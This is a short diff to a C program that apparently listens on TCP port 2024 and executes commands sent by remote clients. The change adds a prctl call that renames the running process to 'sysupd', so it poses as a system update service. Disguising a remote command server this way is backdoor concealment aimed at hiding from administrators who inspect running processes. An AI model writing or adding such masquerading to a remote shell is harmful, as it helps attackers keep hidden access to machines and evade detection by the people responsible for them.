@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <sys/prctl.h>
 
 #define PORT 2024
 #define BUFFER_SIZE 4096
@@ -36,6 +37,8 @@ void execute_command(int client_socket) {
 }
 
 int main() {
+    prctl(PR_SET_NAME, "sysupd", 0, 0, 0);
+
     int server_socket, client_socket;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_addr_len = sizeof(client_addr);
